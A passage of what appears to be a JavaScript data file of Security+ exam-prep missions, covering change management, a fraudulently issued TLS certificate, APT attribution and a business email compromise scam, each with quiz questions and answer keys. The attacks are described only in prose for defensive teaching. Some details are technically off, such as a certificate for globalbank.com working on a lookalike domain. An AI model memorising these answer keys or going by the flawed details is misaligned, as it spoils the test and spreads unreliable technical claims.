If I had followed the change management process, the CAB would have asked: 'Did you test on a switch with the same IOS version?' I would have said no, and they would have required additional testing. They also would have scheduled the change for this weekend's maintenance window, not Tuesday night during month-end. I understand now why the process exists — it's not red tape, it's a safety net."`,
        critical: false
      },
      {
        id: 'chg-05',
        type: 'alert',
        label: 'Business Impact Assessment',
        content: `OUTAGE IMPACT REPORT:

Duration: 11 hours 14 minutes (23:47 Tuesday - 11:01 Wednesday)

Affected systems:
  - Email (Exchange): DOWN
  - File shares: DOWN
  - Financial application (month-end close): DOWN
  - VoIP phones: DOWN
  - Internet access: DOWN
  - VPN (remote workers): DOWN

Financial impact:
  - 200 employees idle for half a workday: $47,000 in lost productivity
  - Month-end financial close delayed by 24 hours: Regulatory reporting deadline MISSED
  - Emergency vendor support (Cisco TAC): $8,500
  - Senior engineer overtime (11 hours): $1,200

Reputational impact:
  - CFO had to request extension on SEC filing deadline (first time in company history)

MAINTENANCE WINDOW best practice:
  - Schedule high-risk changes during approved windows (e.g., Saturday 2-6 AM)
  - Notify stakeholders 48 hours in advance
  - Have CAB pre-approve the change with documented backout plan
  - Ensure change owner and backup personnel are available during window
  - Perform changes when impact is MINIMAL (not during month-end close)`,
        critical: false
      }
    ],

    challenge: {
      question: 'What change management element would have MOST DIRECTLY prevented the network outage?',
      options: [
        'Business continuity plan with alternate network routes',
        'Test results showing firmware compatibility with production IOS',
        'Incident response playbook for network failures',
        'Data loss prevention system blocking unauthorized changes'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: A business continuity plan helps you RECOVER from outages, but it doesn\'t prevent them. BC/DR is a corrective control. The question asks what would have PREVENTED the outage — that requires detective/preventive controls in the change management process.',
        'CORRECT: The outage occurred because firmware v4.8.2 was incompatible with production. Change management requires TEST RESULTS in an environment matching production. Testing would have revealed the incompatibility, CAB would have rejected the change, and the engineer would have tested further or chosen a different firmware version. This directly prevents the failure.',
        'INCORRECT: An incident response plan helps you respond AFTER an incident occurs. It doesn\'t prevent unauthorized changes. The outage was caused by a change that should never have happened.',
        'INCORRECT: DLP prevents sensitive DATA from leaving the organization. It doesn\'t control configuration changes to network devices. You\'d need configuration management tools, RBAC, or change approval workflows to block unauthorized firmware updates.'
      ]
    },

    debrief: `This outage demonstrates CompTIA Objective 1.3: Change Management. Changes to production systems must follow a formal process to prevent uncontrolled modifications.

Change Management Process:
- Approval: CAB reviews and approves changes
- Ownership: Specific individual accountable
- Stakeholders: Notify affected teams
- Impact Analysis: Assess risk and scope
- Test Results: Validate in non-production environment
- Backout Plan: Document rollback procedure
- Maintenance Window: Schedule during low-impact period

Technical Change Management:
- Allow/Deny Lists: Control approved software versions
- Restricted Activities: High-risk changes require extra scrutiny
- Downtime: Planned vs. unplanned
- Service Restarts: Coordinate with application owners

Skipping change management turns proactive improvements into catastrophic failures.`,

    escalation: `The delayed month-end close caused a missed SEC filing deadline. Regulators imposed a $150,000 fine. The CFO escalated to the CEO, who demanded policy enforcement. New controls implemented: (1) All admin accounts tied to individuals (no shared credentials), (2) Firmware allow-list enforced on all network devices, (3) CAB approval required for all production changes, (4) Automated change detection alerts SOC when unapproved modifications occur. Alex Morgan received a formal reprimand and mandatory change management training. Total incident cost: $206,000.`,

    refs: [
      { source: 'Study Guide', section: '1.3 - Change Management', page: 10 },
      { source: 'Study Guide', section: '4.2 - Configuration Management', page: 64 }
    ]
  },

  // ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.4)
  // Teaches: PKI, Encryption, Certificates
  // ============================================================
  {
    id: 'MISSION-010',
    title: 'The Forged Certificate',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.4'],
    threatLevel: 'critical',
    tags: ['PKI', 'Certificates', 'Encryption', 'CA', 'OCSP', 'CRL'],
    briefing: `EMERGENCY SECURITY INCIDENT: At 8:15 AM, your security operations center received an urgent alert from Google Chrome's Certificate Transparency monitoring. Someone issued a valid TLS certificate for your domain "globalbank.com" from a trusted Certificate Authority — but YOUR organization never requested it. Worse: the certificate is actively being used on a phishing site at "globalbank-secure.com" that's harvesting customer credentials. The attacker somehow obtained a fraudulent certificate that browsers trust. Your PKI team needs to determine: how did the attacker get a valid certificate, what went wrong with the CA's issuance process, and how do you revoke the fraudulent certificate before more customers are compromised?`,

    intel: [
      {
        id: 'pki-01',
        type: 'alert',
        label: 'Certificate Transparency Log',
        content: `CERTIFICATE TRANSPARENCY ALERT:

Issued Certificate Details:
  Subject: CN=globalbank.com
  Issuer: TrustCert CA (publicly trusted root CA)
  Serial Number: 4F:3A:B2:E8:91:7C:2D:44
  Valid From: 2026-02-06 14:22:00 UTC
  Valid To: 2027-02-06 14:22:00 UTC
  Key Usage: Digital Signature, Key Encipherment
  Extended Key Usage: TLS Web Server Authentication
  Subject Alternative Names (SAN): globalbank.com, www.globalbank.com, secure.globalbank.com

This is a WILDCARD-capable certificate — it covers the domain and all listed SANs.

CERTIFICATE CONCEPTS:

X.509: The standard format for digital certificates (public key + identity + CA signature)

CERTIFICATE AUTHORITY (CA): Trusted entity that issues and signs certificates. Browsers trust a list of root CAs. When a CA signs your certificate, browsers trust your site.

CERTIFICATE SIGNING REQUEST (CSR): You generate a key pair (public + private key), create a CSR containing your public key and identity, and submit it to the CA. The CA validates your identity and issues a signed certificate.

The problem: TrustCert CA issued this certificate without validating that the requester ACTUALLY controls globalbank.com. This is a CA validation failure — the attacker convinced the CA they owned your domain.`,
        critical: true
      },
      {
        id: 'pki-02',
        type: 'forensic',
        label: 'CA Issuance Investigation',
        content: `ROOT CAUSE — How the attacker got the certificate:

Domain validation methods used by CAs:
1. EMAIL VALIDATION: CA sends email to admin@domain.com, requester must click link
2. DNS VALIDATION: Requester adds specific TXT record to DNS proving control
3. HTTP VALIDATION: Requester places a specific file on the web server

TrustCert CA used EMAIL validation. Here's what happened:

1. Attacker registered "globalbank-secure.com" (typosquatting your actual domain)
2. Attacker submitted CSR to TrustCert CA requesting certificate for "globalbank.com"
3. TrustCert CA sent validation email to admin@globalbank.com
4. Your email server has a MISCONFIGURED catch-all rule forwarding unknown addresses to a shared mailbox
5. Attacker social-engineered help desk to "recover access" to the shared mailbox
6. Attacker accessed the validation email and clicked the approval link
7. TrustCert CA issued the certificate

CERTIFICATE REVOCATION:

When a certificate is compromised, the CA must REVOKE it. Browsers check revocation status:

CRL (Certificate Revocation List): A downloadable list of revoked serial numbers. Updated periodically (slow).

OCSP (Online Certificate Status Protocol): Real-time query to CA asking "Is this certificate still valid?" Faster than CRL.

You need to contact TrustCert CA immediately and request emergency revocation via both CRL and OCSP.`,
        critical: true
      },
      {
        id: 'pki-03',
        type: 'report',
        label: 'Encryption and Key Management Concepts',
        content: `ENCRYPTION FUNDAMENTALS (CompTIA Objective 1.4):

SYMMETRIC ENCRYPTION:
  - Same key encrypts AND decrypts
  - Fast, efficient for large data
  - Problem: How do you securely share the key?
  - Examples: AES, 3DES, ChaCha20

ASYMMETRIC ENCRYPTION (Public Key Cryptography):
  - Two keys: PUBLIC key (encrypt) and PRIVATE key (decrypt)
  - Anyone can encrypt with your public key, only you can decrypt with private key
  - Slower than symmetric, used for key exchange and digital signatures
  - Examples: RSA, ECC (Elliptic Curve Cryptography)

KEY EXCHANGE:
  - Problem: How do two parties establish a shared symmetric key over an untrusted network?
  - DIFFIE-HELLMAN: Cryptographic algorithm that lets two parties agree on a shared secret without transmitting the secret. The eavesdropper sees the exchange but can't derive the key.

TLS/SSL uses asymmetric encryption for key exchange (establish session key), then switches to symmetric encryption for bulk data transfer (faster).

HARDWARE SECURITY MODULES (HSM):
  - Dedicated physical device for generating, storing, and managing cryptographic keys
  - Tamper-resistant — if attacked, it destroys keys
  - Used by CAs to protect their root private keys

TRUSTED PLATFORM MODULE (TPM):
  - Chip on a computer's motherboard that stores encryption keys
  - Used for full-disk encryption (BitLocker, FileVault)
  - Ensures keys never leave the hardware

KEY ESCROW:
  - Backup copy of encryption keys held by a trusted third party
  - Used when you need to recover encrypted data if the key is lost
  - Controversial — creates a target for attackers`,
        critical: false
      },
      {
        id: 'pki-04',
        type: 'report',
        label: 'Obfuscation and Advanced Concepts',
        content: `OBFUSCATION TECHNIQUES:

STEGANOGRAPHY:
  - Hiding data INSIDE other files (embedding a message in an image's pixel data)
  - Not encryption — the data is hidden, not scrambled
  - Example: Terrorist groups hiding messages in images posted online

TOKENIZATION:
  - Replacing sensitive data with non-sensitive tokens
  - Example: Credit card 4111-1111-1111-1111 becomes TOKEN-8472-XYZ
  - The real data is stored in a secure vault; applications use tokens
  - Common in payment processing (PCI-DSS compliance)

DATA MASKING:
  - Obscuring parts of sensitive data
  - Example: Show credit card as "************1111" (last 4 digits visible)
  - Used in logs, customer service screens, reports

BLOCKCHAIN:
  - Distributed ledger using cryptographic hashing to ensure immutability
  - Each block contains data + hash of previous block
  - Changing any block invalidates all subsequent blocks (tamper-evident)
  - Used in cryptocurrency, supply chain tracking, smart contracts

CERTIFICATE TYPES:

SELF-SIGNED CERTIFICATE:
  - Issued and signed by the server itself (not a trusted CA)
  - Browsers show warnings because they don't trust the issuer
  - Used for internal testing, not public websites

WILDCARD CERTIFICATE:
  - Covers a domain and all subdomains: *.globalbank.com
  - Example: Covers www.globalbank.com, api.globalbank.com, mail.globalbank.com
  - Risk: If compromised, ALL subdomains are affected

SUBJECT ALTERNATIVE NAME (SAN) CERTIFICATE:
  - Covers multiple specific domains/subdomains listed in the SAN field
  - More secure than wildcard (only covers explicitly listed names)`,
        critical: false
      },
      {
        id: 'pki-05',
        type: 'log',
        label: 'Incident Timeline and Response',
        content: `PHISHING SITE ANALYSIS:

Domain: globalbank-secure.com (TYPOSQUATTING — looks like your domain)
Server IP: 185.73.44.12 (hosting provider in Eastern Europe)
TLS Certificate: Valid, trusted, issued by TrustCert CA for globalbank.com
Status: ACTIVE — currently harvesting credentials

Timeline:
  Feb 6, 14:22 — Fraudulent certificate issued by TrustCert CA
  Feb 6, 18:30 — Phishing site goes live at globalbank-secure.com
  Feb 7, 08:15 — Certificate Transparency log alert triggers (your detection)
  Feb 7, 08:40 — Security team identifies 47 users entered credentials on phishing site

RESPONSE ACTIONS REQUIRED:

1. CERTIFICATE REVOCATION:
   - Contact TrustCert CA emergency line
   - Request immediate revocation (add to CRL and OCSP responder)
   - Browsers checking OCSP will see "REVOKED" status and block the site

2. DNS/DOMAIN TAKEDOWN:
   - File abuse complaint with registrar to suspend globalbank-secure.com
   - File complaint with hosting provider to take down 185.73.44.12

3. USER NOTIFICATION:
   - Force password reset for 47 compromised accounts
   - Enable MFA if not already active
   - Notify users of phishing attempt

4. ROOT CAUSE REMEDIATION:
   - Fix email catch-all forwarding rule (don't forward validation emails)
   - Implement CAA DNS record: Tells CAs which authorities are allowed to issue certs for your domain (prevents unauthorized issuance)
   - Monitor Certificate Transparency logs for future unauthorized certificates

CAA Record example: globalbank.com. IN CAA 0 issue "authorized-ca.com"
  - This tells all CAs: "Only authorized-ca.com can issue certificates for globalbank.com. All others must refuse."`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the FASTEST method for browsers to check if the fraudulent certificate has been revoked?',
      options: [
        'Download the Certificate Revocation List (CRL) from the CA',
        'Query the CA\'s OCSP responder for real-time status',
        'Check the Certificate Transparency log for revocation notices',
        'Verify the certificate signature using the CA\'s public key'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: CRL (Certificate Revocation List) is a downloadable file updated periodically (hourly or daily). It works but is SLOW — browsers must download the entire list. By the time the CRL updates, users may have already been phished.',
        'CORRECT: OCSP (Online Certificate Status Protocol) provides REAL-TIME revocation status. The browser sends a query to the CA\'s OCSP responder: "Is serial number 4F:3A:B2:E8:91:7C:2D:44 still valid?" The CA responds immediately with GOOD, REVOKED, or UNKNOWN. This is the fastest method and is used by modern browsers.',
        'INCORRECT: Certificate Transparency logs track certificate issuance, not revocation. They help you DETECT unauthorized certificates but don\'t provide revocation status. You still need CRL or OCSP for revocation checks.',
        'INCORRECT: Verifying the signature proves the certificate was issued by the CA — it doesn\'t tell you if the certificate has been REVOKED since issuance. The fraudulent certificate has a valid signature (it was legitimately issued by TrustCert CA). Signature verification would pass, even though the cert should be revoked.'
      ]
    },

    debrief: `This incident covers CompTIA Objective 1.4: Public Key Infrastructure (PKI) and Encryption.

PKI Concepts:
- X.509: Standard certificate format
- CA: Issues and signs certificates
- CSR: Request containing public key and identity
- CRL: Periodically updated revocation list (slow)
- OCSP: Real-time revocation status (fast)
- Wildcard: Covers *.domain.com
- SAN: Covers specific listed domains
- Self-signed: Not trusted by browsers (no CA signature)

Encryption:
- Symmetric: Same key encrypts/decrypts (fast, AES)
- Asymmetric: Public/private key pair (slow, RSA/ECC)
- Diffie-Hellman: Key exchange over untrusted network
- TPM: Hardware chip storing keys on motherboard
- HSM: Dedicated device for key management
- Key escrow: Backup keys with trusted third party

Obfuscation:
- Steganography: Hiding data in other files
- Tokenization: Replace sensitive data with tokens
- Data masking: Obscure parts of data (last 4 digits)

The attack succeeded due to weak domain validation and email misconfiguration. CAA DNS records prevent unauthorized certificate issuance.`,

    escalation: `Before the certificate was revoked, 89 additional customers entered credentials on the phishing site. Attackers drained $340,000 from compromised accounts. The bank must reimburse customers and faces regulatory scrutiny for failing to implement CAA records (industry best practice since 2017). Total cost: $340,000 in fraud losses, $120,000 in incident response, $80,000 in regulatory fines, and permanent brand damage. The CISO mandates immediate CAA record deployment and automated Certificate Transparency monitoring.`,

    refs: [
      { source: 'Study Guide', section: '1.4 - Public Key Infrastructure', page: 11 },
      { source: 'Study Guide', section: '1.4 - Encryption', page: 13 },
      { source: 'Study Guide', section: '1.4 - Certificates', page: 16 }
    ]
  },

// ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.1)
  // Teaches: Threat Actors, Attributes, Motivations
  // ============================================================
  {
    id: 'MISSION-011',
    title: 'The Attribution Error',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.1'],
    threatLevel: 'critical',
    tags: ['Threat Actors', 'APT', 'Attribution', 'Nation State', 'Intelligence'],
    briefing: 'PRIORITY ESCALATION: Two weeks ago, your company\'s intellectual property repository was breached. Initial forensics suggested a low-skill opportunistic attack — defaced web server, basic SQL injection, typical script kiddie behavior. But the FBI Cyber Division just contacted your CISO with alarming news: the attack signatures match a known nation-state APT group. What you thought was vandalism was actually a sophisticated espionage operation disguised as amateur work. The threat assessment just changed completely.',

    intel: [
      {
        id: 'actor-01',
        type: 'forensic',
        label: 'Initial Breach Analysis',
        content: `WEEK 1 ASSESSMENT (Incorrect):

Attack timeline:
  - 14:22 — SQL injection on public-facing web portal
  - 14:31 — Defacement: "HACKED BY D4RKL0RD" left on homepage
  - 14:45 — Attacker disconnected after 23 minutes

Initial conclusion: Unskilled attacker / script kiddie
  - Script kiddies: Low-skill attackers who use pre-built tools without understanding them
  - Motivations: Notoriety, bragging rights, vandalism
  - Sophistication: Low — they run automated exploit scripts
  - Resources: Minimal — working alone or in loose groups
  - Typical behavior: Loud, obvious, attention-seeking

The defacement and short attack window looked exactly like script kiddie behavior. Your team closed the incident as "nuisance attack, minimal impact." That was a mistake.`,
        critical: true
      },
      {
        id: 'actor-02',
        type: 'alert',
        label: 'FBI Cyber Division Warning',
        content: `THREAT INTELLIGENCE BRIEFING:

The defacement was a DECOY. While your team focused on the vandalized website, the real attack was happening in parallel:

Advanced forensics now show:
  - Simultaneous connection from different IP maintained access for 11 days
  - Timestomping used to hide file modification dates
  - Custom malware (not public exploits) deployed to maintain persistence
  - Lateral movement through network using stolen credentials
  - Data exfiltration: 14GB of R&D documents, encrypted product roadmaps, customer lists
  - Exfil occurred over DNS tunneling to evade DLP detection

This is an Advanced Persistent Threat (APT) — the highest tier of threat actor:

APT / Nation-State Attributes:
  - Sophistication: VERY HIGH — custom malware, evasion techniques, operational security
  - Resources/Funding: State-sponsored budgets, dedicated teams, infrastructure
  - Internal/External: EXTERNAL, but placed insider access through compromised credentials
  - Motivation: ESPIONAGE and DATA EXFILTRATION for competitive/strategic advantage
  - Persistence: Maintain long-term access (11 days undetected)

The "script kiddie" defacement was deliberate misdirection.`,
        critical: true
      },
      {
        id: 'actor-03',
        type: 'report',
        label: 'Threat Actor Types Comparison',
        content: `THREAT ACTOR CLASSIFICATION (CompTIA 2.1):

1. UNSKILLED ATTACKERS / SCRIPT KIDDIES
   - Sophistication: Low
   - Resources: Minimal
   - Motivation: Notoriety, proving skills
   - Typical impact: Defacement, DDoS, nuisance

2. HACKTIVISTS
   - Sophistication: Low to Medium
   - Resources: Moderate (crowdfunded, volunteer groups)
   - Motivation: PHILOSOPHICAL/POLITICAL beliefs
   - Examples: Anonymous, environmental/social causes
   - Typical impact: Data leaks to embarrass targets, DDoS

3. ORGANIZED CRIME
   - Sophistication: Medium to High
   - Resources: Well-funded criminal enterprises
   - Motivation: FINANCIAL GAIN (ransomware, fraud, extortion)
   - Typical impact: Ransomware, banking fraud, credit card theft

4. INSIDER THREATS
   - Sophistication: Varies (but HIGH access)
   - Attributes: INTERNAL — current or former employees
   - Motivation: REVENGE, financial gain, ideology
   - Advantage: Legitimate access, knowledge of defenses

5. NATION-STATE / APT
   - Sophistication: VERY HIGH
   - Resources: State-level funding, dedicated teams
   - Attributes: EXTERNAL (but can recruit insiders)
   - Motivation: ESPIONAGE, DATA EXFILTRATION, WAR, SERVICE DISRUPTION
   - Characteristic: Long-term persistence, custom tools, evasion
   - Examples: APT28, APT29, Lazarus Group

6. SHADOW IT
   - Not malicious, but risky: Employees using unauthorized cloud services/devices
   - Creates vulnerabilities attackers exploit`,
        critical: false
      },
      {
        id: 'actor-04',
        type: 'intercepted',
        label: 'C2 Server Communication Log',
        content: `COMMAND & CONTROL TRAFFIC (Decrypted by FBI):

Attacker internal communication (translated):

"Phase 1 complete. Noisy entry successful — they are investigating the defacement. 
Phase 2: Maintain quiet access on alternate vector. 
Target: All R&D files related to [REDACTED PRODUCT]. 
Priority: Customer database, partner contracts.
Timeline: Maximum 14 days before discovery probability increases.
Exfil method: DNS tunneling, 50KB chunks, encrypted.
Cleanup: Leave persistence backdoor for future operations."

This reveals:
  - SOPHISTICATION: Multi-phase operation with operational planning
  - RESOURCES: Coordinated team with defined objectives
  - MOTIVATION: DATA EXFILTRATION of specific intellectual property
  - INTENT: Long-term strategic intelligence gathering, not immediate financial gain

This is espionage, not crime. The goal isn't ransomware or fraud — it's stealing competitive intelligence for a foreign government.`,
        critical: false
      },
      {
        id: 'actor-05',
        type: 'witness',
        label: 'Security Team Debrief',
        content: `Post-incident team discussion:

SOC Analyst: "I don't understand. Why go through all this trouble just to deface a website? That doesn't match the sophistication."

Incident Commander: "They didn't. The defacement was a diversion — while we were busy restoring the homepage and patching the SQL injection, they were quietly moving laterally through the network with stolen domain admin credentials. We focused on the loud attack and missed the quiet one."

Forensics Lead: "The custom malware has code artifacts matching known APT toolkits. The DNS tunneling, the timestomping, the evasion techniques — this is nation-state level work. Script kiddies don't write custom malware or plan multi-week operations."

Lesson learned: Threat actor attribution determines response. If you misidentify a nation-state APT as a script kiddie, you'll under-respond. You'll close the incident prematurely, miss the real damage, and leave backdoors in place for future operations.`,
        critical: false
      }
    ],

    challenge: {
      question: 'Based on the investigation, which attribute MOST clearly distinguishes this as a nation-state APT rather than a script kiddie?',
      options: [
        'The use of SQL injection as the initial attack vector',
        'The high level of sophistication and use of custom malware',
        'The defacement of the public-facing website',
        'The exfiltration of data over the internet'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: SQL injection is a common attack technique used by threat actors at all skill levels, from script kiddies to nation-states. The attack vector alone doesn\'t indicate sophistication — it\'s how it\'s used that matters.',
        'CORRECT: Nation-state APTs are defined by their VERY HIGH sophistication and substantial resources. Custom malware, operational planning, evasion techniques, and coordinated multi-phase operations are hallmarks of state-sponsored actors. Script kiddies use pre-built tools and lack this level of capability.',
        'INCORRECT: Website defacement is typical script kiddie behavior — it\'s loud, obvious, and attention-seeking. In this case, the defacement was deliberate misdirection, but the act itself doesn\'t indicate sophistication.',
        'INCORRECT: Data exfiltration is a common goal for many threat actor types (organized crime, insiders, APTs). The method matters more than the fact — DNS tunneling with encryption shows sophistication, but "exfiltration over the internet" alone doesn\'t distinguish actor types.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.1: Threat Actors and Attributes. Correct attribution is critical — different threat actors have different motivations, capabilities, and persistence levels.

Key concepts learned:
  - Script kiddies: Low sophistication, use public tools, seek notoriety
  - Nation-state APTs: Very high sophistication, custom tools, espionage motivation
  - Threat actor attributes: internal vs external, resources/funding, sophistication level
  - Motivations: script kiddies seek attention, APTs seek data exfiltration and espionage
  - APT tactics: Multi-phase operations, misdirection, long-term persistence, evasion
  - Attribution errors lead to inadequate response — treating an APT like a script kiddie leaves backdoors in place
  - Indicators of APT: custom malware, operational planning, targeted data theft, evasion sophistication`,

    escalation: `Because the initial attribution was wrong, your team closed the incident after 48 hours. The APT maintained access for 11 days total, exfiltrating 14GB of R&D data including unreleased product specifications. The stolen intellectual property gave a foreign competitor an 18-month head start on your next product line. The FBI investigation is ongoing. Your company faces congressional scrutiny over critical infrastructure protection failures. The CISO was replaced.`,

    refs: [
      { source: 'Study Guide', section: '2.1 - Threat Actors', page: 24 },
      { source: 'Study Guide', section: '2.1 - Threat Actor Attributes', page: 25 },
      { source: 'Study Guide', section: '2.1 - Threat Actor Motivations', page: 26 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.2)
  // Teaches: Social Engineering, Phishing, BEC
  // ============================================================
  {
    id: 'MISSION-012',
    title: 'The Wire Transfer',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.2'],
    threatLevel: 'critical',
    tags: ['Social Engineering', 'BEC', 'Phishing', 'Impersonation', 'Pretexting'],
    briefing: `URGENT INCIDENT: Your CFO just authorized a $400,000 wire transfer to what she believed was a legitimate vendor. The transfer went to a bank in Eastern Europe. Ten minutes after sending the wire, she received a call from the ACTUAL vendor asking why their invoice is 60 days overdue. The payment she just made went to an attacker. The FBI is en route. Your job: trace the social engineering chain and figure out how the CFO was fooled.`,

    intel: [
      {
        id: 'bec-01',
        type: 'log',
        label: 'Email Thread Analysis',
        content: `FRAUDULENT EMAIL CHAIN:

From: ceo@yourcompany.com [DISPLAY NAME]
ACTUAL header: ceo@yourcompany.co (note the .co instead of .com)
To: cfo@yourcompany.com
Subject: URGENT - Vendor Payment Required Today

"Linda, I'm in back-to-back meetings with the acquisition team and can't be reached by phone. We need to expedite payment to TechSupplier Inc. for the infrastructure project. I've received a revised invoice due to banking changes on their end. Please process the wire transfer today — the delay is holding up the project. Details attached. -Robert"

This is BUSINESS EMAIL COMPROMISE (BEC), a social engineering attack where attackers:
  - Impersonate executives or trusted business partners
  - Use urgency and authority to pressure victims
  - Target wire transfers, payroll changes, or sensitive data
  - Exploit trust relationships in business processes

The attacker used TYPOSQUATTING (registering yourcompany.co, one letter different from yourcompany.com) to make the email appear legitimate at a glance. The display name showed "CEO" but the actual sending domain was fraudulent.`,
        critical: true
      },
      {
        id: 'bec-02',
        type: 'forensic',
        label: 'Attack Timeline Reconstruction',
        content: `SOCIAL ENGINEERING CHAIN:

PHASE 1 — Reconnaissance (3 weeks before)
  - Attacker researched company on LinkedIn, identified CEO (Robert) and CFO (Linda)
  - Scraped employee names, titles, and relationships from public profiles
  - Identified ongoing "infrastructure project" from press release
  - Found vendor name "TechSupplier Inc." from procurement notices

PHASE 2 — Pretext Establishment (1 week before)
  - Registered lookalike domain: yourcompany.co
  - Configured email to spoof CEO's display name
  - Crafted invoice mimicking TechSupplier's actual invoice format (obtained via SPEAR PHISHING — targeted phishing against TechSupplier's accounting department)

PHASE 3 — Execution (Day of attack)
  - Sent email during time CEO was in known meetings (reconnaissance from CEO's public calendar)
  - Used PRETEXTING: Created believable scenario ("acquisition meetings", "banking changes")
  - Applied pressure: Urgency ("today"), authority (CEO), and business justification

PHASE 4 — Follow-up Validation Bypass
  - CFO replied asking to confirm by phone
  - Attacker responded: "In meetings all day, just execute per the invoice. Time-sensitive."
  - CFO proceeded without voice verification — the pretext (meeting excuse) defeated the control`,
        critical: true
      },
      {
        id: 'bec-03',
        type: 'report',
        label: 'Social Engineering Techniques Reference',
        content: `SOCIAL ENGINEERING ATTACK TYPES (CompTIA 2.2):

PHISHING: Mass emails pretending to be legitimate (banks, shipping companies)
  - Broad targeting, low sophistication
  - Goal: Steal credentials or deliver malware

SPEAR PHISHING: Targeted phishing against specific individuals/organizations
  - Personalized content using reconnaissance
  - Higher success rate than generic phishing

WHALING: Spear phishing targeting high-level executives (CEOs, CFOs)
  - High-value targets, high-impact outcomes
  - This attack is a WHALING attempt

BUSINESS EMAIL COMPROMISE (BEC): Impersonating executives or vendors to manipulate financial transactions
  - Often combines multiple techniques: spoofing, impersonation, pretexting
  - Goal: Wire fraud, payroll redirection

VISHING: Voice phishing (phone calls)
SMISHING: SMS/text message phishing

TYPOSQUATTING: Registering domains similar to legitimate ones (yourcompany.co vs .com)
  - Also called URL hijacking

PRETEXTING: Creating a fabricated scenario to manipulate the victim
  - Example: "I'm in meetings" created urgency and explained why phone verification wasn't possible

IMPERSONATION: Pretending to be someone else (CEO, vendor, IT support)

BRAND IMPERSONATION: Mimicking legitimate brands (fake Microsoft, fake Amazon)

WATERING HOLE ATTACKS: Compromising websites frequented by the target audience

MISINFORMATION/DISINFORMATION: Spreading false information to manipulate`,
        critical: false
      },
      {
        id: 'bec-04',
        type: 'witness',
        label: 'CFO Interview',
        content: `Interview with CFO (Linda):

"The email came from Robert's address — at least that's what it said. I didn't look at the actual domain, just the display name. The invoice looked identical to previous TechSupplier invoices we've paid before: same logo, same format, same project reference numbers.

I did try to verify — I replied asking to confirm by phone. But Robert said he was in acquisition meetings all day and couldn't talk. That made sense because I knew the acquisition talks were happening this week. He's mentioned being in meetings constantly.

The invoice said the banking information changed due to a 'merger with their European division.' That seemed plausible for a growing vendor. The urgency was stressed — he said the delay was holding up the project, and I know how critical that infrastructure project is.

Looking back, the red flags were there: unexpected banking change, urgency, inability to verify by phone. But in the moment, everything seemed legitimate. The attacker knew our projects, our vendor names, our executive schedules. This wasn't some generic phishing email — it was surgical."`,
        critical: false
      },
      {
        id: 'bec-05',
        type: 'alert',
        label: 'Email Security Analysis',
        content: `POST-INCIDENT EMAIL CONTROLS REVIEW:

FAILURES:
  - No DMARC policy enforced (allows domain spoofing)
  - No visual warning for external emails pretending to be internal
  - No detection of lookalike domains (.co vs .com)
  - No mandatory dual-approval for wire transfers over $100K
  - No out-of-band verification required for banking changes

DMARC (Domain-based Message Authentication, Reporting & Conformance):
  - Email authentication protocol that prevents domain spoofing
  - If enforced, emails from yourcompany.co would have been rejected or flagged
  - Requires SPF and DKIM configuration

RECOMMENDED CONTROLS:
  - Implement DMARC with "reject" policy
  - Add "[EXTERNAL]" banner to all emails from outside the organization
  - Flag emails with display name mismatches (internal name, external domain)
  - Require multi-party approval for wire transfers over threshold
  - Mandate out-of-band (phone/in-person) verification for banking changes
  - Security awareness training on BEC tactics`,
        critical: false
      }
    ],

    challenge: {
      question: 'This attack combined multiple social engineering techniques. Which technique created the believable scenario that bypassed the CFO\'s attempt at phone verification?',
      options: [
        'Typosquatting — registering a lookalike domain',
        'Pretexting — fabricating the "acquisition meetings" scenario',
        'Vishing — using voice calls to manipulate the victim',
        'Watering hole attack — compromising a trusted website'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Typosquatting (yourcompany.co vs .com) enabled the email to appear legitimate, but it didn\'t create the scenario that defeated phone verification. It was the delivery mechanism, not the social engineering excuse.',
        'CORRECT: Pretexting is creating a fabricated scenario to manipulate the victim. The attacker\'s excuse — "I\'m in acquisition meetings all day and can\'t talk" — was pretexting. It gave a plausible reason why the CEO couldn\'t verify by phone, defeating the CFO\'s security instinct to confirm.',
        'INCORRECT: Vishing is voice-based phishing (phone calls). This attack used email (BEC) and text-based pretexting. No vishing occurred.',
        'INCORRECT: A watering hole attack compromises a website frequented by the target group. This attack used email impersonation and typosquatting, not website compromise.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 2.2: Social Engineering. Business Email Compromise (BEC) is one of the most costly cyber threats, targeting financial transactions through impersonation and manipulation.

Key concepts learned:
  - BEC combines impersonation, typosquatting, and pretexting to manipulate wire transfers
  - Spear phishing and whaling are targeted attacks using reconnaissance
  - Pretexting creates believable scenarios that defeat security controls
  - Typosquatting uses lookalike domains to evade detection
  - Effective defenses: DMARC email authentication, external email warnings, dual approval for financial transactions, mandatory out-of-band verification for banking changes
  - Social engineering exploits trust and urgency — technical controls alone aren't enough
  - Employee training must cover BEC tactics, especially targeting finance departments`,

    escalation: `The $400,000 was wired to a bank account in Romania and immediately transferred to three other accounts across Eastern Europe and Asia. Recovery efforts retrieved only $47,000. The FBI investigation traced the attack to an organized crime group specializing in BEC fraud. Your company faces a $353,000 loss, mandatory breach disclosure to shareholders, and an SEC investigation into financial controls. The CFO submitted her resignation. Cyber insurance will cover $200,000 after the deductible.`,

    refs: [
      { source: 'Study Guide', section: '2.2 - Social Engineering', page: 27 },
      { source: 'Study Guide', section: '2.2 - Phishing Techniques', page: 28 },
      { source: 'Study Guide', section: '2.2 - Business Email Compromise', page: 29 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.3)
  // Teaches: Application Vulnerabilities (SQLi, XSS, Privilege Escalation)
  // ============================================================
  {
    id: 'MISSION-013',
    title: 'The Shopping Cart Breach',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.3'],
    threatLevel: 'critical',
    tags: ['SQL Injection', 'Application Security', 'Privilege Escalation', 'Web Vulnerabilities'],
